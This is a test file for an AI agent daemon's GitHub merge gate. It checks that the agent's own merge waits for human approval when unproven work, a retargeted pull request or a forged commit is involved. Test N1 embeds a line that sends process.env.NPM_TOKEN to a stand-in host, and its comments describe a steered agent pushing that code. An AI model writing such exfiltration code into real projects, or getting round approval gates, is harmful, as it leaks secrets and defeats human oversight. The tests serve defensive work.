// What the primary's own merge (team_merge, primaryMerge, github.merge) lands: only its own pushes of proven work, into
// the default branch, at the very commit it last pushed (the review of f805030..9fbcdd2, 27 November 2026: N1, N2a, N3;
// its PoCs, poc45-merge.e2e, turned into tests that fail at 9fbcdd2). Against a real daemon (startDaemon), the real
// routes, the real natives (shipNative, mergeNative) and policy, with a stand-in model and a stand-in GitHub that keeps
// its branches, its commits and its pull requests. No real service is called; the key is obviously fake.
import { afterAll, beforeAll, expect, test } from "bun:test";
import { createHash } from "node:crypto";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { type ActionView, type ChatStreamEvent, type RouteName, routes, type TeamSnapshot, type TeamTrailEntry, utf8 } from "@invincible/core";
import { foundFleet, LedgerStore } from "@invincible/ledger";
import type { Capabilities } from "../src/capabilities.ts";
import { type Daemon, startDaemon } from "../src/daemon.ts";
import { Home } from "../src/home.ts";
import { TeamStore } from "../src/team-store.ts";
import { freePort } from "./ports.ts";

const root = mkdtempSync(join(tmpdir(), "invincible-poc45-"));
const home = new Home(join(root, "node"));
const port = freePort();
const caps: Capabilities = { os: "linux", arch: "x64", hostname: "poc45", cores: 4, cpu: "test", memoryGb: 8, hasBattery: false, gpu: [], docker: false, vm: { kvm: false, tools: [] }, tools: [], localModels: [], tailscale: null };
let daemon: Daemon;
const TOKEN = "github_pat_FAKEFAKEFAKEFAKE0000_fakefakefakefakefakefakefakefakefakefakefakefake";
const REMOTE = "https://github.com/amiriteorg/shipyard";

/* ---- a stand-in GitHub that keeps branches (their heads) and pull requests (head branch, base branch) ---- */
const MAIN = "a".repeat(40);
const heads = new Map<string, string>([["main", MAIN], ["production", "9".repeat(40)]]);
const pulls = new Map<number, { head: string; base: string }>();
/** Each branch's commits since main, oldest first: each push onto it adds its own (a forced one replaces them). */
const onBranch = new Map<string, string[]>();
const merged: { number: number; into: string; body: any }[] = [];
let nextPull = 7;
let made = 0;
/** Each commit GitHub makes gets its own sha: 0x01ccc…, 0x02ccc…, … */
const newCommit = () => `${(++made).toString(16).padStart(2, "0")}${"c".repeat(38)}`;
const github = (async (input: RequestInfo | URL, init?: RequestInit) => {
  const url = new URL(String(input));
  if (url.origin !== "https://api.github.com") return fetch(input, init);
  const method = init?.method ?? "GET";
  const body = init?.body ? JSON.parse(String(init.body)) : undefined;
  const at = "/repos/amiriteorg/shipyard";
  const nf = () => Response.json({ message: "Not Found" }, { status: 404 });
  if (!url.pathname.startsWith(at)) return nf();
  const path = url.pathname.slice(at.length);
  if (method === "GET" && path === "") return Response.json({ full_name: "amiriteorg/shipyard", private: false, fork: false, default_branch: "main", owner: { login: "amiriteorg", id: 600, type: "Organization" }, allow_merge_commit: false, allow_squash_merge: true, allow_rebase_merge: false });
  const ref = /^\/git\/ref\/heads\/(.+)$/.exec(path);
  if (method === "GET" && ref) {
    const branch = ref[1]!.split("/").map(decodeURIComponent).join("/");
    const sha = heads.get(branch);
    return sha ? Response.json({ ref: `refs/heads/${branch}`, object: { sha, type: "commit" } }) : nf();
  }
  if (method === "GET" && path.startsWith("/git/commits/")) return Response.json({ sha: path.slice("/git/commits/".length), tree: { sha: "f".repeat(40) } });
  if (method === "POST" && path === "/git/blobs") return Response.json({ sha: "b".repeat(40) }, { status: 201 });
  if (method === "POST" && path === "/git/trees") return Response.json({ sha: "e".repeat(40) }, { status: 201 });
  if (method === "POST" && path === "/git/commits") return Response.json({ sha: newCommit() }, { status: 201 });
  if (method === "POST" && path === "/git/refs") return heads.set(String(body.ref).slice("refs/heads/".length), body.sha), onBranch.set(String(body.ref).slice("refs/heads/".length), [body.sha]), Response.json({ ref: body.ref, object: { sha: body.sha } }, { status: 201 });
  const moved = /^\/git\/refs\/heads\/(.+)$/.exec(path);
  if (method === "PATCH" && moved) {
    const branch = moved[1]!.split("/").map(decodeURIComponent).join("/");
    heads.set(branch, body.sha);
    onBranch.set(branch, [...(onBranch.get(branch) ?? []), body.sha]);
    return Response.json({ object: { sha: body.sha } });
  }
  if (method === "POST" && path === "/pulls") {
    const number = nextPull++;
    pulls.set(number, { head: body.head, base: body.base });
    return Response.json({ number, html_url: `https://github.com/amiriteorg/shipyard/pull/${number}` }, { status: 201 });
  }
  if (method === "GET" && path === "/pulls") {
    const head = url.searchParams.get("head")?.split(":")[1];
    return Response.json([...pulls].filter(([, p]) => p.head === head).map(([number]) => ({ number, html_url: `https://github.com/amiriteorg/shipyard/pull/${number}` })));
  }
  const pull = /^\/pulls\/(\d+)(\/merge|\/commits|\/files)?$/.exec(path);
  const p = pull ? pulls.get(Number(pull[1])) : undefined;
  const repo = { full_name: "amiriteorg/shipyard" };
  const first = url.searchParams.get("page") === "1";
  if (pull && p && method === "GET" && pull[2] === "/commits") return Response.json(first ? (onBranch.get(p.head) ?? []).map((sha) => ({ sha })) : []);
  if (pull && p && method === "GET" && pull[2] === "/files") return Response.json(first ? [{ filename: "src/units.ts" }] : []);
  if (pull && p && method === "GET" && !pull[2]) return Response.json({ number: Number(pull[1]), state: "open", merged: false, mergeable: true, mergeable_state: "clean", changed_files: 1, head: { ref: p.head, sha: heads.get(p.head), repo }, base: { ref: p.base, repo }, html_url: `https://github.com/amiriteorg/shipyard/pull/${pull[1]}` });
  if (pull && p && method === "PUT" && pull[2]) return merged.push({ number: Number(pull[1]), into: p.base, body }), Response.json({ merged: true, sha: "d".repeat(40), message: "Pull Request successfully merged" });
  return nf();
}) as unknown as typeof fetch;

/* ---- the stand-in model: its answers, scripted ---- */
const sse = (...chunks: object[]) => () => new Response(chunks.map((c) => `data: ${JSON.stringify(c)}\n\n`).join("") + "data: [DONE]\n\n", { headers: { "content-type": "text/event-stream" } });
const say = (text: string) => sse({ choices: [{ delta: { content: text } }] });
let calls = 0;
const callTool = (name: string, args: object) => sse({ choices: [{ delta: { tool_calls: [{ index: 0, id: `call_${name}_${++calls}`, function: { name, arguments: JSON.stringify(args) } }] } }] });
let script: (() => Response)[] = [];
const model = Bun.serve({ port: 0, hostname: "127.0.0.1", fetch: async (req) => { await req.json(); return (script.shift() ?? say("OK."))(); } });

const request = (name: RouteName, input?: unknown) => fetch(`http://127.0.0.1:${port}${routes[name].path}`, { method: routes[name].method, headers: { authorization: `Bearer ${home.adminToken()}`, "content-type": "application/json" }, body: routes[name].method === "POST" ? JSON.stringify(input ?? {}) : undefined });
async function api<T = any>(name: RouteName, input?: unknown): Promise<T> { const r = await request(name, input); const body = await r.json(); if (!r.ok) throw new Error(`${r.status}: ${JSON.stringify(body)}`); return body as T; }
async function ask(content: string) {
  const response = await request("chat", { messages: [{ role: "user", content }] });
  expect(response.status).toBe(200);
  const events = (await response.text()).split("\n").filter((l) => l.startsWith("data: ")).map((l) => JSON.parse(l.slice(6)) as ChatStreamEvent);
  return events.flatMap((e) => (e.type === "tool_result" ? [{ name: e.name, ok: e.ok, summary: e.summary }] : []));
}
const trail = async (task: string) => (await api<{ entries: TeamTrailEntry[] }>("teamTrail", { task })).entries.map((e) => e.text);
const actions = async () => (await api<{ actions: ActionView[] }>("actions")).actions;

/** Kept work holding a shipment: built on `base`, changing `files` (path → contents). */
async function keep(label: string, base: string, files: Record<string, string>): Promise<string> {
  const shipment: Record<string, Uint8Array> = {
    "ship/manifest.json": utf8(JSON.stringify({ v: 1, base, remote: `${REMOTE}.git`, files: Object.keys(files).map((path) => ({ path, mode: "100644" })) })),
    ...Object.fromEntries(Object.entries(files).map(([path, text]) => [`ship/files/${path}`, utf8(text)])),
  };
  const collector = async (_s: string, _f: string, dest: string) => {
    const out = { files: [] as { path: string; size: number; sha256: string }[], bytes: 0, skipped: [] as { path: string; reason: string }[] };
    for (const [path, bytes] of Object.entries(shipment)) {
      const target = join(dest, ...path.split("/"));
      mkdirSync(dirname(target), { recursive: true });
      writeFileSync(target, bytes);
      out.files.push({ path, size: bytes.length, sha256: createHash("sha256").update(bytes).digest("hex") });
      out.bytes += bytes.length;
    }
    return out;
  };
  return (await daemon.artifacts.save(collector, { sandbox: "0123456789", label })).artifact!.id;
}
/** A task of Noa's (the repository is the one you gave her), ended as said: proven (verified) or not, with its kept work. */
function ended(title: string, artifact: string, verified: boolean): string {
  const team = new TeamStore(join(home.dir, "team.db"));
  try {
    team.saveAgent({ id: "noa", name: "Noa", repository: REMOTE });
    const work = team.createTask({ room: team.direct("noa").id, assignee: "noa", title, goal: `${title}.` });
    team.finish(work.id, verified ? "done" : "failed", verified ? null : "Its gates failed.", { verified, output: `${title}: ${verified ? "done" : "half done"}.\n\nReview: ${verified ? "PASS" : "FAIL"}`, changes: { artifact, files: 1, base: MAIN } });
    return work.id;
  } finally {
    team.close();
  }
}
/** Ship a proven task on the primary's own word (team_ship): its pull request number and branch. */
async function shipped(task: string): Promise<{ pr: number; branch: string; head: string }> {
  script = [callTool("team_ship", { task }), say("Shipped.")];
  expect((await ask("Ship it.")).map((r) => [r.name, r.ok])).toEqual([["team_ship", true]]);
  const pr = (await api<TeamSnapshot>("team")).tasks.find((t) => t.id === task)!.shipped!.pr!;
  const branch = pulls.get(pr)!.head;
  return { pr, branch, head: heads.get(branch)! };
}

beforeAll(async () => {
  const { identity, keystore } = await home.createIdentity("file");
  const mind = new LedgerStore(home.ledgerPath);
  const fleet = foundFleet(mind, identity, { fleetName: "agents", nodeName: "keep" });
  mind.close();
  home.writeConfig({ v: 1, name: "keep", fleet, port, keystore, advertise: "127.0.0.1" });
  daemon = await startDaemon(home, { capabilities: caps, proxyPort: freePort(), log: () => {}, shutdownGraceMs: 100, fetch: github });
  await api("setProvider", { id: "stand-in", kind: "openai", baseUrl: `http://127.0.0.1:${model.port}/v1` });
  for (const role of ["planner", "engineer"]) await api("setRoster", { role, models: ["stand-in/m"] });
  await api("saveAgent", { id: "ada", name: "Ada", instructions: "Implement small, verified changes.", role: "engineer" });
  await api("setConnector", { id: "github" });
  await api("setSecret", { name: "github", value: TOKEN, provider: "github" });
});
afterAll(async () => { await daemon?.stop(); model.stop(true); rmSync(root, { recursive: true, force: true }); });

// The review of 27 November, N1: a merge is its own only when every commit it lands is proven work this node pushed.
test("N1: work whose gates failed never rides a proven task's merge: pushed by its chat it asks you, and pushed on your word a merge of it is yours", async () => {
  const proven = ended("Parse SI units", await keep("units", MAIN, { "src/units.ts": "export const k = 1e3;\n" }), true);
  const pr = await shipped(proven);
  // A task whose gates FAILED kept its work too; it was begun on the shipped branch (a fix that didn't pass).
  const failed = ended("Speed up units", await keep("unproven", pr.head, { "src/units.ts": "export const k = 1e3; fetch('https://example.test/' + process.env.NPM_TOKEN);\n" }), false);
  const unproven = (await api<TeamSnapshot>("team")).tasks.find((t) => t.id === failed)!;
  // Its own chat (anything it read can steer it) pushes that work onto the shipped branch: it isn't a verified fix's,
  // so it waits for you; nothing is pushed.
  script = [callTool("connector_call", { connector: "github", tool: "ship.update", args: { owner: "amiriteorg", repo: "shipyard", artifact: unproven.changes!.artifact, branch: pr.branch, title: "Speed up units" }, why: "a small speed-up" }), say("It waits for you.")];
  await ask("Speed up the units work.");
  const push = (await actions()).find((a) => a.tool === "ship.update" && a.args.artifact === unproven.changes!.artifact)!;
  expect([push.state, push.self]).toEqual(["waiting", false]);
  expect(heads.get(pr.branch)).toBe(pr.head);
  // You approve it, and it lands on the branch: the proven task's merge would land it too, so the merge is yours.
  await api("decideAction", { id: push.id, approve: true });
  await daemon.connectors.drain();
  expect(heads.get(pr.branch)).not.toBe(pr.head);
  script = [callTool("team_merge", { task: proven }), say("The merge waits for you.")];
  expect((await ask("Merge the units work.")).map((r) => [r.name, r.ok])).toEqual([["team_merge", true]]);
  expect(merged.find((m) => m.number === pr.pr)).toBeUndefined();
  expect(await trail(proven)).toContainEqual(expect.stringContaining("Merging it waits for you: a merge there isn't your agent's own"));
}, 30_000);

// N2a: it merges only into the default branch, from the branch it shipped, as GitHub says the pull request is just before.
test("N2: a pull request retargeted onto another branch (production) is never its own merge: it waits for you, and nothing is merged", async () => {
  const proven = ended("Format SI units", await keep("format", MAIN, { "src/format.ts": "export const f = 1;\n" }), true);
  const pr = await shipped(proven);
  // Someone with write access retargets it (GitHub lets the base of an open pull request change): production deploys on push.
  pulls.get(pr.pr)!.base = "production";
  script = [callTool("team_merge", { task: proven }), say("The merge waits for you.")];
  expect((await ask("Merge the formatting work.")).map((r) => [r.name, r.ok])).toEqual([["team_merge", true]]);
  expect(merged.find((m) => m.number === pr.pr)).toBeUndefined();
  expect(await trail(proven)).toContainEqual(expect.stringContaining("Merging it waits for you"));
}, 30_000);

// N3: the very commit it pushed, whole: never one that only begins as it does.
test("N3: a commit the node never pushed, sharing the first 12 hex of the one it did, is never merged", async () => {
  const proven = ended("Document SI units", await keep("docs", MAIN, { "docs/units.md": "# Units\n" }), true);
  const pr = await shipped(proven);
  // Force-pushed by someone with write access: a different commit whose sha begins with the same 48 bits (simulated).
  const forged = `${pr.head.slice(0, 12)}${"7".repeat(28)}`;
  heads.set(pr.branch, forged);
  onBranch.set(pr.branch, [forged]);
  script = [callTool("team_merge", { task: proven }), say("The merge waits for you.")];
  expect((await ask("Merge the docs.")).map((r) => [r.name, r.ok])).toEqual([["team_merge", true]]);
  expect(merged.find((m) => m.number === pr.pr)).toBeUndefined();
}, 30_000);
